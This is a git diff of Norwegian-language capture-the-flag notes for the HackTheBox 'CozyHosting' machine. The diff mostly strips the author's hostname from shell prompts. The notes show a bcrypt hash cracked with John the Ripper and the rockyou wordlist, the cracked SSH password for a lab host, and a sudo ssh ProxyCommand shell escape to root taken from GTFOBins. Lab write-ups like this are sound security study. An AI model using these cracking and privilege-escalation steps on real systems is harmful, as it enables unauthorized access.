@@ -119,7 +119,7 @@ id | username  |      hostname
 $2a$1 vil si at det er bcrypt hash
 10 er første nummeret. Det vil si at  hashen ble laget med en fakotor av 10
 
-──(johems㉿BeastJohe)-[~/HB/CozyHosting]
+──(johems㉿)-[~/HB/CozyHosting]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
@@ -131,13 +131,13 @@ manchesterunited (?)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 
-┌──(johems㉿BeastJohe)-[~/HB/CozyHosting]
+┌──(johems㉿)-[~/HB/CozyHosting]
 └─$ ssh josh@10.129.198.143
-
 password = manchesterunited 
-```
 
-# privilege escalation from user to rootsudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+
+# privilege escalation from user to root
+sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 
 source 
 https://gtfobins.github.io/gtfobins/ssh/ 
